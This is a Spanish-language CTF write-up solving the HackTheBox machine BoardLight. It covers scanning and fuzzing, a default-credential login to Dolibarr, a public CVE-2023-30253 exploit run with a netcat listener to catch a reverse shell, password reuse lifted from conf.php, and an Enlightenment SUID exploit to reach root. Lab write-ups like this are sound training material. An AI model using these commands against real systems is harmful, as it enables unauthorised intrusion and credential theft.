---
layout: single
title: Maquina BoardLight - Hack The box
excerpt: "En este post vamos a resolver la maquina BoardLight de HackTheBox"
date: 
classes: wide
header:
  teaser: /assets/images/Maquinas/BoardLight/BoardLight.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - vulnerabilidad web
tags:  
  - HackTheBox
---

<br>
## Escaneo con Nmap y whatweb

Empezaremos a escanear si existen puertos abiertos usando **nmap**:

```sudo nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- -oG Puertos 10.10.11.11```

-sS: Enviaremos paquetes TCP SYN scan para comprobar si esta abierto o no.

--min-rate 5000: Enviar al menos 5 mil paquetes por segundo, esto es para acelerar el proceso.

--open: Que nos muestre solo los puertos abiertos.

-vvv: Queremos triple verbose para ver más información a medida que se va ejecutando y ver en tiempo real las respuestas.

-n: Desactivamos resolución DNS para acelerar el proceso de escaneo.

-Pn: Desactivar escaneo de hosts.

-oG: Guardar la salida del comando en un archivo llamado Puertos en formato Grep.

Y el resultado nos dice que los puertos:

![image](/assets/images/Maquinas/BoardLight/nmap.png)

- 80 (http)
- 22 (ssh)

Ahora usaremos scripts de enumeración bajo esos puertos para ver que logramos obtener:

`nmap -sC -sV -p 22,80 -oN targeted 10.10.11.11`

![image](/assets/images/Maquinas/BoardLight/nmap2.png)

Nos reporta lo siguiente, podemos ver la versión y servicio que corren bajo esos puertos y algunos otros detalles más.

Escanearemos el servidor web usando la herramienta **whatweb**:

![image](/assets/images/Maquinas/BoardLight/whatweb.png)

Vemos que usa Apache en su versión 2.4.41, un email que termina en board.htb esto podría ser un indicio de que esta usando otro DNS llamado board.htb, y también vemos otra información no tan importante.

<br>
## Revisando la web

Ahora iremos a la web para ver que nos topamos:

![image](/assets/images/Maquinas/BoardLight/web.png)

Vemos esta web, en la cuál buscando no encontramos nada interesante, así que procederemos a enumerar los directorios ocultos de la web haciendo fuzzing.

<br>
## Fuzzing de directorios ocultos con dirsearch

Ahora con la herramienta **dirsearch** haremos fuzzing a la web:

`dirsearch --url http://10.10.11.11/ -e txt,php`

Indicamos la URL, y también las extensiones de archivo que queremos que nos encuentre aparte de los directorios ocultos.

> Recuerda que dirsearch por defecto usa un diccionario no tan largo, pero si deseas puedes usar wfuzz para escanear más directorios con algún diccionario más largo.

Y vemos que al terminar de escanear nos encontró algunos archivos y otras cosas pero nada tan interesante:

![image](/assets/images/Maquinas/BoardLight/dirsearch.png)

Como no encontramos algo tan útil, lo que haremos será hacer otro fuzzing.

## Virtual hosting

Recordamos que encontramos un correo con terminación en **board.htb**, esto es posible que este usando un concepto llamado virtual hosting, lo que permite a una maquina tener diferentes dominios.

Por lo que agregaremos este dominio con su respectiva IP host a el archivo **/etc/hosts** de nuestro equipo atacante:

![image](/assets/images/Maquinas/BoardLight/addDNS.png)

Vemos que hemos agregado el dominio, ahora iremos a `http://board.htb/` en el navegador y vemos que nos carga la web:

![image](/assets/images/Maquinas/BoardLight/board.png)

Al parecer es la misma interfaz web, pero tal vez haya nuevas cosas aquí, así que ahora vamos a hacer fuzzing de sub-dominios.

## Fuzzing de sub-dominios DNS con WFUZZ

Ahora usando la herramienta **wfuzz** vamos a hacer fuzzing a posibles subdominios:

`wfuzz -w subdomains-top1million-5000.txt --hl=517 -t 200 -H "Host: FUZZ.board.htb" http://board.htb/`

-w: Indicamos el diccionario, en este caso usamos el top1millon-subdomains.

--hl=517: Estamos ocultando las respuestas que tengan 517 lineas, ya que así identificamos las consultas que dan error y las ocultamos para no perder la verdadera con las erroneas.

-t 200: Usamos 200 hilos.

-H: Indicamos el Host donde se va a aplicar el fuzzing, y por último la URL.

Ejecutamos y vemos lo siguiente:

![image](/assets/images/Maquinas/BoardLight/crm.png)

Encontramos un sub-dominio llamado "crm", así que accederemos a el para ver con que nos topamos, pero antes hay que agregar este dominio al **/etc/hosts**:

![image](/assets/images/Maquinas/BoardLight/addcrm.png)

Ahora iremos a ese dominio:

![image](/assets/images/Maquinas/BoardLight/login.png)

Y encontramos un panel login usando algo llamado "dolibarr" en su versión 17.0.0.

## Explotando el CRM Dolibarr

Buscando en google las credenciales por defecto encontramos lo siguiente:

![image](/assets/images/Maquinas/BoardLight/default.png)

Vemos que las credenciales por defecto son usuario: admin y password: admin.

Probamos y por ahora tenemos una sesión:

![image](/assets/images/Maquinas/BoardLight/access.png)

Pero no tenemos acceso a muchas utilidades, al investigar podemos crear una plantilla de web y agregar código PHP:

![image](/assets/images/Maquinas/BoardLight/test.png)

Y al volver a la web:

![image](/assets/images/Maquinas/BoardLight/codephp.png)

Podemos ver que de cierta forma se interpreta el código, así que buscando algún exploit que aproveche de esto, encontramos el siguiente:

[Exploit Dolibarr]("https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

Clonamos el repositorio y vemos la ejecución:

![image](/assets/images/Maquinas/BoardLight/usage.png)

Así que ahora lo ejecutamos con nuestras instrucciones:

Pero primero antes ponemos el puerto por el cuál queramos recibir la conexión , en este caso usando netcat abriremos el puerto 4040 obviamente en otra terminal ya que en la actual ejecutaremos el exploit:

`nc -nlvp 4040`
![image](/assets/images/Maquinas/BoardLight/nc.png)

Una vez estemos en escucha, vamos a ejecutar el exploit con el orden que es necesario:

`python3 exploit.py http://crm.board.htb admin admin 10.10.15.52 4040`

Primero el exploit, luego la URL, después el usuario y contraseña del acceso que obtuvimos, y por último la IP de nuestra maquina atacante, ya que a esa IP se enviará la conexión que el servidor web ejecutará gracias al exploit, y esa conexión la recibiremos a esa IP por el puerto 4040.

Una vez ejecutemos recibiremos la reverse shell que dejamos en escucha en el puerto 4040:

![image](/assets/images/Maquinas/BoardLight/conect.png)

Vemos que hemos logrado obtener una sesión.

## Tratamiento de la TTY

Ahora ya que estamos dentro del servidor, vamos a hacer el tratamiento de la TTY para tener una shell interactiva:

`script /dev/null -c bash`

ctrl + z

`stty raw -echo; fg`

`reset`

`xterm`

Y luego ejecutamos:

export TERM=xterm : para indicar que queremos una xterm de terminal.

export SHELL=bash : Y que queremos una bash.

Por último solo quedaría ir a una terminal nuestra y ejecutar esto:

`stty size`

Y los valores que nos devuelva los usaremos para ajustar la reverse shell a el tamaño de nuestra terminal por defecto y no tener problemas de proporciones:

` stty rows 40 columns 123`

![image](/assets/images/Maquinas/BoardLight/tty.png)

Ahora ya tenemos debajo la reverse shell totalmente interactiva para continuar.

## Escalando privilegios

Ahora somos el usuario `www-data` pero nos interesa escalar a un usuario con mas privilegios, por lo que ahora busque donde se encuentra los archivos de configuración de dolibarr en la wiki de dolibarr:

![image](/assets/images/Maquinas/BoardLight/wikibar.png)

Así que en el sistema existe un archivo llamado conf.php, así que usando el comando find vamos a buscar archivos que tengan ese nombre:

`find / -type f -name "conf.php" 2>/dev/null`

Pedimos que encuentre desde la raíz / del sistema, un tipo -type de archivo f , que tenga el nombre -name de "conf.php" y redirigimos los errores al /dev/null.

Y nos muestra lo siguiente:

![image](/assets/images/Maquinas/BoardLight/ruta.png)

Nos da una ruta: "/var/www/html/crm.board.htb/htdocs/conf/conf.php".

Así que al acceder a ese archivo  vemos lo siguiente:

![image](/assets/images/Maquinas/BoardLight/credentials.png)

Encontramos al parecer el usuario y contraseña de un usuario en la base de datos, probablemente esta contraseña se use igual para el usuario al que queremos escalar, ya que si hacemos un ls a la ruta /home:

![image](/assets/images/Maquinas/BoardLight/larissa.png)

Encontramos un usuario llamado `larissa`, así que probaremos acceder a este usuario con esa contraseña que encontramos:

![image](/assets/images/Maquinas/BoardLight/entrarlarissa.png)

Podemos ver que efectivamente era la misma contraseña de la base de datos que la de el usuario.

Por lo que ya estamos como el usuario larissa, y ahora podemos ver que hay en su directorio personal:

![image](/assets/images/Maquinas/BoardLight/flag.png)

Vemos que logramos conseguir la primera flag, ya que hemos logrado acceder al sistema como un usuario con privilegios, pero ahora nos falta el privilegio mas importante que es el usuario root.

Así que usando find buscaremos si tenemos algun archivo con permisos SUID mal configurado:

`find / -type f -perm -4000 2>/dev/null`

Queremos encontrar desde la raíz / un tipo de archivo f, que tenga permisos 4000 SUID, y redirigimos los errores al /dev/null.

Y nos muestra lo siguiente:

![image](/assets/images/Maquinas/BoardLight/suid.png)

Lo que me llama la atención son los archivos que son de enlightenment ya que estos no suelen estar por defecto en las maquinas.

Así que buscando:

![image](/assets/images/Maquinas/BoardLight/exploit.png)

Di con este repositorio en github el cúal es un exloit que aprovecha esos binarios SUID para escalarnos a root, así que copiamos el código del exploit y lo pegamos en un archivo en la maquina del usuario larissa:

![image](/assets/images/Maquinas/BoardLight/paste.png)

Usando el editor vi, pegamos el código, guardamos y ahora ejecutaremos el exploit:

![image](/assets/images/Maquinas/BoardLight/root.png)

Y vemos que hemos logrado escalar privilegios a root, y con esto hemos terminado de resolver esta maquina. c:

